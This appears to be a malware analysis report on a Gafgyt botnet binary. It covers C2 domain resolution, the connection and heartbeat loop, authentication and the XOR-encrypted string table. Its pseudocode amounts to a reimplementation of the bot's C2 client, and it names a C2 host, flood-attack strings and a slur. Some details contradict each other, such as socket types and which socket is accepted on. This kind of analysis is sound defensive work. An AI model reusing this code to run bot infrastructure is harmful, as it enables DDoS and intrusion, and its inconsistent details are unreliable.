# Gafgyt Botnet — Transport Layer Technical Specification

## 1. C2 Infrastructure Retrieval

### 1.1 Observed Behavior

The binary retrieves C2 server information through a two-stage process:

1. **String Table Initialization**: At startup, `table_init()` (0x0040e530) copies 101 encrypted string entries from the `.rodata` section (starting at 0x00419ed1) into heap-allocated buffers. Each entry is stored in a 16-byte record at a global array beginning at 0x0051eac0, with pointer at offset 0 and size (uint16) at offset 8.

2. **C2 Address Resolution**: The `resolve_c2_address()` function (0x0040ce30) performs:
   - Retrieves the encrypted C2 domain string from string table entry 0
   - Decrypts it via `table_unlock_val(0)` (the decompiler labels it as index 1 in some contexts)
   - Passes the decrypted domain to `dns_resolve()` for manual DNS resolution
   - Selects a random IP from the DNS response array
   - Retrieves the C2 port from string table entry 2 (decompiler index)
   - Populates a `sockaddr_in` structure at 0x0051eaa0

### 1.2 Recovered C2 Address & Port

| Parameter | Value | Source |
|-----------|-------|--------|
| **C2 Domain** | `osfjkqoiw382r552q.hopto.org` | String table entry 0 (src: 0x00419ed1, size: 28 bytes) |
| **C2 Port** | `51` (0x0033, network byte order) | String table entry 2 (src: 0x00419ef1, size: 2 bytes) |
| **Socket Family** | `AF_INET` (2) | Hardcoded in main |

**C2 Address Structure** (stored at 0x0051eaa0):
```c
struct sockaddr_in srv_addr;
srv_addr.sin_family = 2;        // AF_INET (hardcoded)
srv_addr.sin_port = 0x0033;     // Port 51 (from string table entry 2, network byte order)
srv_addr.sin_addr.s_addr = <resolved IP from DNS>;  // Populated by resolve_c2_address()
```

### 1.3 DNS Resolution Logic

The binary implements a custom DNS resolver (`dns_resolve()` at 0x0040ded0) rather than using system libraries:

```
FUNCTION dns_resolve(domain_name):
    // Encode domain name in DNS wire format (length-prefixed labels)
    dns_query = build_dns_query(domain_name)
    
    // Generate random transaction ID
    txn_id = rand_xorshift() & 0xFFFF
    
    // Build DNS request header
    header = {
        id: txn_id,
        flags: 0x0100,           // Standard query, recursion desired
        qdcount: 1,
        ancount: 0,
        nscount: 0,
        arcount: 0
    }
    
    // Query type: A record (0x0001), class: IN (0x0001)
    question = encode_label(domain_name) + [0x00, 0x01, 0x00, 0x01]
    
    // Create UDP socket and connect to DNS server 8.8.8.8:53
    socket_fd = socket(AF_INET, SOCK_DGRAM, 0)
    dns_server = { family: AF_INET, addr: 0x08080808, port: 0x0035 }
    connect(socket_fd, dns_server)
    
    // Set non-blocking
    ioctl(socket_fd, FIONBIO, 1)
    
    // Send query and wait for response (up to 5 retries with 1s sleep)
    FOR retry = 1 TO 5:
        sendto(socket_fd, header + question, length, 0)
        
        // 5-second select timeout
        result = select(socket_fd + 1, [socket_fd], NULL, NULL, {5, 0})
        
        IF response received:
            response = recvfrom(socket_fd, buffer, 0x800, 0)
            
            // Verify transaction ID matches
            IF response[0:2] == txn_id:
                // Parse answer section
                answer_count = ntohs(response[6:8])
                result_list = allocate_dns_result_list()
                
                FOR each answer:
                    IF rtype == 0x0001 (A record) AND rclass == 0x0001 (IN):
                        IF rdlength == 4:
                            ip_address = response[rdoffset:rdoffset+4]
                            append(result_list, ip_address)
                
                RETURN result_list  // Structure: { count, [ip1, ip2, ...] }
        
        sleep(1)
    
    RETURN NULL  // Resolution failed
```

### 1.4 C2 Retrieval Logic (Complete)

```
FUNCTION resolve_c2_address():
    // Step 1: Get C2 domain from string table
    table_unlock_val(0)                           // Decrypt entry 0
    domain_ptr = table_retrieve_val(0, NULL)      // Get pointer to "osfjkqoiw382r552q.hopto.org"
    
    // Step 2: DNS resolution
    dns_result = dns_resolve(domain_ptr)           // Custom UDP DNS to 8.8.8.8:53
    table_lock_val(0)                              // Re-encrypt entry 0
    
    IF dns_result == NULL:
        RETURN  // Resolution failed
    
    // Step 3: Select random IP from DNS response
    ip_count = dns_result->count
    random_idx = rand_xorshift() % ip_count
    srv_addr.sin_addr.s_addr = dns_result->ips[random_idx]
    
    // Step 4: Get C2 port from string table entry 2
    table_unlock_val(2)                           // Decrypt entry 2
    port_value = *(uint16*)table_retrieve_val(2, NULL)  // 0x0033 = port 51
    srv_addr.sin_port = port_value
    table_lock_val(2)                             // Re-encrypt entry 2
    
    // srv_addr is now ready for connect()
```

---

## 2. Transport Initialization

### 2.1 Observed Behavior

The transport layer uses a TCP socket with non-blocking I/O managed through a `select()`-based event loop. The connection lifecycle includes:

1. Socket creation with `socket(AF_INET, SOCK_STREAM, 0)`
2. Non-blocking mode via `ioctl(FIONBIO)`
3. Timeout configuration via `setsockopt(SO_SNDTIMEO)` and `setsockopt(SO_RCVTIMEO)`
4. Non-blocking `connect()` initiation
5. `select()` polling for connection completion
6. Authentication handshake on successful connection
7. Continuous heartbeat and command processing

### 2.2 Network Parameters

| Parameter | Value | Details |
|-----------|-------|---------|
| **Protocol** | TCP (`SOCK_STREAM`) | `socket(AF_INET, 1, 0)` |
| **Address Family** | IPv4 (`AF_INET = 2`) | Hardcoded |
| **Socket Mode** | Non-blocking | `ioctl(fd, FIONBIO, 1)` via `fcntl` |
| **Send Timeout** | 10 seconds | `setsockopt(SO_SNDTIMEO, timeval{10, 0})` |
| **Receive Timeout** | 10 seconds | `setsockopt(SO_RCVTIMEO, timeval{10, 0})` |
| **Select Timeout** | 10 seconds | `select()` with `timeval{10, 0}` |
| **Heartbeat Interval** | 60 seconds | 2-byte ping every 6 select timeouts |
| **Reconnect Delay** | 1 second | `sleep(1)` on connection failure |

### 2.3 Single-Instance Control Socket

A separate UDP socket binds to port 0x4500 (17664) on 127.0.0.1 (or the bot's local IP) for single-instance enforcement:

```c
// Control socket initialization (main, before daemonization)
fd_ctrl = socket(AF_INET, SOCK_STREAM, 0)
setsockopt(fd_ctrl, SOL_SOCKET, SO_REUSEADDR, 1, 4)
ioctl(fd_ctrl, FIONBIO, 1)
fcntl(fd_ctrl, F_SETFL, O_NONBLOCK)

bind_addr = {
    sin_family: AF_INET,
    sin_port: 0x4500,      // Port 17664 (network byte order)
    sin_addr: 0x7F000001   // 127.0.0.1 (or local IP if DAT_0051c488 is set)
}
bind(fd_ctrl, bind_addr, 16)

// If bind fails with errno != EADDRINUSE (99), mark as failed
```

### 2.4 Connection Logic

```
GLOBAL:
    fd_ctrl = -1          // Control socket (single-instance)
    fd_serv = -1          // C2 server socket
    srv_addr              // sockaddr_in with C2 IP:port
    c2_password[0x20]     // Password from argv[1], zero-initialized
    heartbeat_counter = 0

FUNCTION main_select_loop():
    WHILE TRUE:
        // Initialize fd_set for select()
        read_set = {}
        write_set = {}
        
        // Add control socket to read set
        IF fd_ctrl != -1:
            add(read_set, fd_ctrl)
        
        // If no C2 connection, initiate one
        IF fd_serv == -1:
            fd_serv = socket(AF_INET, SOCK_STREAM, 0)
            
            IF fd_serv != -1:
                // Set 10-second timeouts
                setsockopt(fd_serv, SOL_SOCKET, SO_SNDTIMEO, {tv_sec:10, tv_usec:0})
                setsockopt(fd_serv, SOL_SOCKET, SO_RCVTIMEO, {tv_sec:10, tv_usec:0})
                
                // Set non-blocking
                ioctl(fd_serv, FIONBIO, 1)
                fcntl(fd_serv, F_SETFL, O_NONBLOCK)
                
                // Resolve C2 address if needed
                IF resolve_callback != NULL:
                    resolve_callback()  // Calls resolve_c2_address()
                
                // Initiate non-blocking connect
                connect_status = IN_PROGRESS
                connect(fd_serv, srv_addr, 16)
            
            // Add to write set to detect connection completion
            add(write_set, fd_serv)
        ELSE:
            // Connected: add to read set for data
            add(read_set, fd_serv)
        
        // Determine max fd
        max_fd = max(fd_ctrl, fd_serv) + 1
        
        // Select with 10-second timeout
        result = select(max_fd, read_set, write_set, NULL, {10, 0})
        
        IF result == -1:
            CONTINUE  // Interrupted, retry
        
        // Handle timeout (heartbeat)
        IF result == 0:
            heartbeat_counter += 1
            
            IF heartbeat_counter % 6 == 0:  // Every 60 seconds
                send_ping = [0x00, 0x00]
                bytes_sent = send(fd_serv, send_ping, 2, MSG_DONTWAIT)
                
                IF bytes_sent == -1:
                    close(fd_serv)
                    fd_serv = -1
                    sleep(1)
                    CONTINUE
        
        // Handle control socket (single-instance check)
        IF fd_ctrl != -1 AND fd_ctrl IN read_set:
            // Incoming connection on control port = another instance detected
            client_fd = accept(fd_serv, NULL, NULL)
            
            IF client_fd > 0:
                close(fd_serv)
                fd_serv = -1
                close(client_fd)
                
                // Increase sleep interval up to 60 seconds
                current_sleep = DAT_0051c478 * 2
                IF current_sleep < 61:
                    DAT_0051c478 = current_sleep
                ELSE:
                    DAT_0051c478 = 60
                
                sleep(DAT_0051c478)
                CONTINUE
        
        // Handle C2 connection
        IF fd_serv != -1:
            IF connect_status == IN_PROGRESS:
                IF fd_serv IN write_set:
                    // Connection might be established
                    err = getsockopt(fd_serv, SOL_SOCKET, SO_ERROR)
                    IF err == 0:
                        connect_status = CONNECTED
                        // Send authentication
                        authenticate_c2(fd_serv)
                    ELSE:
                        close(fd_serv)
                        fd_serv = -1
                        sleep(1)
                        CONTINUE
                ELSE IF fd_serv IN read_set:
                    // Connection failed
                    close(fd_serv)
                    fd_serv = -1
                    sleep(1)
                    CONTINUE
            
            ELSE IF fd_serv IN read_set:
                // Receive C2 data
                err = 0
                bytes_recv = recv(fd_serv, header_buf, 2, MSG_DONTWAIT)
                
                IF bytes_recv == -1:
                    err = errno
                    IF err == EAGAIN OR err == EINTR:
                        CONTINUE  // No data yet, retry
                    ELSE:
                        close(fd_serv)
                        fd_serv = -1
                        sleep(1)
                        CONTINUE
                
                IF bytes_recv == 0:
                    // Connection closed by server
                    close(fd_serv)
                    fd_serv = -1
                    sleep(1)
                    CONTINUE
                
                // Check for heartbeat response (0x0000)
                IF header_buf[0] == 0x00:
                    recv(fd_serv, ack_buf, 2, MSG_DONTWAIT)  // Consume ack
                    CONTINUE  // Back to select loop
                
                // Parse packet length (big-endian, 2 bytes)
                payload_len = ntohs(header_buf)
                
                IF payload_len > 0x400:  // Max 1024 bytes
                    close(fd_serv)
                    fd_serv = -1
                    CONTINUE
                
                // Receive payload
                payload = recv(fd_serv, buffer, payload_len, MSG_DONTWAIT)
                
                // Receive trailing 2-byte checksum/ack
                recv(fd_serv, trailing_buf, 2, MSG_DONTWAIT)
                trailing_len = ntohs(trailing_buf)
                IF trailing_len > 0:
                    recv(fd_serv, trailing_data, trailing_len, MSG_DONTWAIT)
                
                // Process C2 command
                IF trailing_len != 0:
                    process_c2_packet(buffer, trailing_len)

FUNCTION authenticate_c2(fd):
    // Send local IP (4 bytes)
    local_ip = get_local_ip()  // Via UDP probe to 8.8.8.8:53
    send(fd, &local_ip, 4, MSG_DONTWAIT)
    
    // Send password length (1 byte)
    pwd_len = strlen(c2_password)
    send(fd, &pwd_len, 1, MSG_DONTWAIT)
    
    // Send password (pwd_len bytes)
    IF pwd_len > 0:
        send(fd, c2_password, pwd_len, MSG_DONTWAIT)
    
    // Send authentication byte from string table entry 3
    table_unlock_val(3)
    auth_byte = table_retrieve_val(3, NULL)
    send(fd, auth_byte, 1, MSG_DONTWAIT)
    table_lock_val(3)
```

### 2.5 Local IP Discovery

The `get_local_ip()` function (0x00410010) determines the bot's local IP address:

```
FUNCTION get_local_ip():
    // Create UDP socket
    fd = socket(AF_INET, SOCK_DGRAM, 0)
    
    // Connect to 8.8.8.8:53 (doesn't send data, just sets peer)
    target = { family: AF_INET, addr: 0x08080808, port: 0x0035 }
    connect(fd, target, 16)
    
    // Get the local endpoint that would be used
    local_addr = getsockname(fd)
    
    close(fd)
    RETURN local_addr.sin_addr.s_addr
```

---

## 3. String Table Analysis

### 3.1 Observed Behavior

The binary uses an encrypted string table to obfuscate all string literals. The mechanism operates as follows:

1. **Initialization** (`table_init()` at 0x0040e530):
   - Allocates heap memory for each of the 101 string entries
   - Copies encrypted bytes from `.rodata` (0x00419ed1 onwards) into heap buffers
   - Stores pointer and size in a global array at 0x0051eac0

2. **Access Pattern**:
   - `table_unlock_val(index)`: Decrypts the string in-place (XOR)
   - `table_retrieve_val(index, &len)`: Returns pointer to decrypted string
   - `table_lock_val(index)`: Re-encrypts the string in-place (XOR)

3. **Storage Structure** (at 0x0051eac0):
```c
struct string_entry {
    void*   ptr;      // Heap pointer to string data (8 bytes)
    uint16  size;     // String size in bytes (2 bytes)
    // Total: 10 bytes per entry, aligned to 16 bytes
};
// Entry N is at: 0x0051eac0 + N * 16
//   ptr at offset 0, size at offset 8
```

### 3.2 Decryption Routine

```
GLOBAL:
    XOR_KEY = 0xDEADBEEF  // Stored at 0x0051c48c

FUNCTION table_unlock_val(index):
    entry = &string_table[index]
    IF entry->size == 0:
        RETURN
    
    ptr = entry->ptr
    FOR i = 0 TO entry->size - 1:
        ptr[i] = ptr[i] XOR (XOR_KEY & 0xFF)           // XOR with byte 0 (0xEF)
        ptr[i] = ptr[i] XOR ((XOR_KEY >> 8) & 0xFF)    // XOR with byte 1 (0xBE)
        ptr[i] = ptr[i] XOR ((XOR_KEY >> 16) & 0xFF)   // XOR with byte 2 (0xAD)
        ptr[i] = ptr[i] XOR ((XOR_KEY >> 24) & 0xFF)   // XOR with byte 3 (0xDE)
    
    // Effective per-byte XOR: 0xEF ^ 0xBE ^ 0xAD ^ 0xDE = 0x22

FUNCTION table_lock_val(index):
    // Identical to table_unlock_val (XOR is its own inverse)
    table_unlock_val(index)

FUNCTION table_retrieve_val(index, *out_len):
    entry = &string_table[index]
    IF out_len != NULL:
        *out_len = entry->size
    RETURN entry->ptr
```

**Effective XOR Key**: `0x22` (since `0xEF ^ 0xBE ^ 0xAD ^ 0xDE = 0x22`)

### 3.3 Recovered Strings

#### C2-Related Entries

| Index | Size | Source Address | Decrypted Value | Purpose |
|-------|------|----------------|-----------------|---------|
| 0 | 28 | 0x419ed1 | `osfjkqoiw382r552q.hopto.org` | C2 domain name |
| 1 | 2 | 0x419eee | `E` | Startup banner/signature |
| 2 | 2 | 0x419ef1 | `\x33\x00` (port 51, NBO) | C2 port |
| 3 | 15 | 0x419ef4 | `Bruh why again` | C2 auth string (1 byte sent) |

#### Path and System Entries

| Index | Size | Decrypted Value | Purpose |
|-------|------|-----------------|---------|
| 4 | 7 | `/proc` | Process scanning path |
| 5 | 5 | `/etc` | Config directory |
| 6 | 4 | `/exe` | Executable path component |
| 7 | 6 | `/fd` | File descriptor path |
| 8 | 8 | `/maps` | Memory maps path |
| 9 | 14 | `/status`, `/proc` | Process status paths |
| 10 | 9 | `/net/tcp` | Network connections |
| 11 | 5 | `/cmd` | Command path |
| 12 | 11 | `line`, `tmp/` | Temp file names |
| 13 | 7 | `data/l` | Data file prefix |
| 14 | 2 | `oc` | Filename suffix |
| 15 | 4 | `al` | Filename suffix |

#### Architecture Strings (Entries 16-30)

| Index | Size | Decrypted Value | Purpose |
|-------|------|-----------------|---------|
| 16 | 4 | `qtxb` | Architecture identifier |
| 17 | 5 | `ot` | Architecture |
| 18 | 5 | `arc` | ARC architecture |
| 19 | 5 | `arm` | ARM architecture |
| 20 | 4 | `ar` | Architecture prefix |
| 21 | 7 | `arm5` | ARM v5 |
| 22 | 4 | `arm6` | ARM v6 |
| 23 | 5 | `arm7` | ARM v7 |
| 24 | 5 | `x86` | x86 architecture |
| 25 | 4 | `x86_` | x86 prefix |
| 26 | 4 | `64` | 64-bit suffix |
| 27 | 4 | `sh4` | SuperH architecture |
| 28 | 5 | `mips` | MIPS architecture |
| 29 | 6 | `mpsl` | MIPS little-endian |
| 30 | 21 | `ppc`, `sda`, `mtd`, `bot` | Various arch/identifiers |

#### Watchdog Paths (Entries 35-44)

| Index | Size | Decrypted Value | Purpose |
|-------|------|-----------------|---------|
| 35 | 15 | `/dev/watchdog` | Primary watchdog device |
| 36 | 14 | `/dev/misc/watch` | Alternative watchdog |
| 37 | 23 | `/sbin/watchdog`, `/` | Watchdog binary path |
| 38 | 23 | `/bin/watchdog`, `/dev/FTWDT` | Alternative watchdog paths |
| 39 | 15 | `FTWDT101_watchdog` | FTWDT watchdog |
| 40 | 22 | `/dev/FTWDT101/watchdog` | FTWDT full path |
| 41 | 14 | `/dev/watchdo` | Partial watchdog path |
| 42 | 10 | `/etc/d` | Config prefix |
| 43 | 11 | `efault/watch` | Default watchdog config |
| 44 | 15 | `/etc/watch` | Watchdog config path |

#### Killer Process Target Strings (Entries 45-54)

| Index | Size | Decrypted Value | Purpose |
|-------|------|-----------------|---------|
| 45 | 16 | `dvrHelper`, `NiGGeR69xd` | Competing malware names |
| 46 | 14 | `NiGGeR69xd`, `1` | Competing malware |
| 47 | 11 | `337SoraLOAD` | Competing malware |
| 48 | 5 | `ER` | Process name fragment |
| 49 | 5 | `iGGeR` | Process name fragment |
| 50 | 16 | `d1onks1337`, `X19I2` | Credentials/identifiers |
| 51 | 14 | `39124UIU` | Credential |
| 52 | 9 | `uj5eIqn` | Credential |
| 53 | 19 | `/proc/net/route`, `/proc/cpuinfo` | System info paths |
| 54 | 23 | `/proc/cpuinfo` | CPU information |

#### HTTP Attack Strings (Entries 58-100)

| Index | Size | Decrypted Value (truncated) | Purpose |
|-------|------|-----------------------------|---------|
| 58 | 8 | `PRIVMSGS` | IRC/HTTP command |
| 59 | 11 | `GETLOCALIP` | Command identifier |
| 60 | 9 | `KILLATTACK` | Attack control |
| 61 | 6 | `Eats` | HTTP header |
| 70 | 23 | `Connection: keep-alive` | HTTP header |
| 71 | 83 | `keep-alive`, `setCookie`, `refresh`, `location`, `set-cookie`, `content-length`, `transf` | HTTP headers batch |
| 72 | 32 | `er-encoding:`, `chunked`, `connection` | HTTP headers batch |
| 73 | 48 | `server: dosarrest`, `server: cloudflare-nginx` | Server header spoofing |
| 77 | 12 | `Accept: text` | HTTP Accept header |
| 78 | 16 | `text/html,application` | HTTP Accept header |
| 79 | 19 | `application/xhtml+xml` | HTTP Accept header |
| 80 | 8 | `application/xml` | HTTP Accept header |
| 81 | 11 | `xml;q=0.9,image/` | HTTP Accept header |

**Note**: Entries 85-99 contain large HTTP attack payloads (64-123 bytes each) used for HTTP flood DDoS attacks. These include crafted HTTP request headers and body content.

---

## 4. Analysis Gaps

### 4.1 Port Value Ambiguity

The C2 port value (entry 2) decrypts to bytes `0x33 0x00`. This is stored directly into `sockaddr_in.sin_port` without byte swapping. The interpretation depends on byte order:
- **Network byte order** (big-endian): Port 51 (0x0033)
- **Host byte order** (little-endian, x86): Port 13056 (0x3300)

The classification guide mentions typical ports 53537 (0xD121) and 48101 (0xBBAF), neither of which matches the decrypted value. **The exact port interpretation requires runtime verification** as the binary stores the value directly without explicit byte-order conversion.

### 4.2 DNS Server

The custom DNS resolver hardcodes `8.8.8.8` (0x08080808) as the DNS server address. This is confirmed in both `dns_resolve()` and `get_local_ip()`. No fallback DNS servers are configured.

### 4.3 Crypto Key Initialization

The XOR key `0xDEADBEEF` is stored statically in the `.data` section at 0x0051c48c. The `init_crypto_key()` function initializes separate PRNG state (at 0x0051c9e0-0x0051c9ec) using `setsid()`, `getpid()`, `gettid()`, and `get_time_seed()`, but does NOT modify the XOR key. The string table decryption key remains constant at `0xDEADBEEF`.

### 4.4 String Table Entry 3 Purpose

Entry 3 decrypts to the string "Bruh why again" (15 bytes). In the authentication sequence, only 1 byte is sent from this entry. The exact byte sent depends on whether the pointer points to the first character ('B' = 0x42) or is offset. **Runtime analysis would confirm which byte is transmitted.**

### 4.5 C2 Protocol Details

The packet processing function (`process_c2_packet` at 0x00402310) reveals:
- Command ID at offset 0 (4 bytes, network byte order)
- Parameter at offset 4 (1 byte): -1 = kill attack, -2 = download update
- Target count at offset 5 (1 byte)
- Target entries: 5 bytes each (4-byte IP + 1-byte port/cidr)
- Option count at offset after targets (1 byte)
- Options: variable length with key-value pairs

**The complete C2 protocol specification is beyond the scope of this transport layer analysis.**
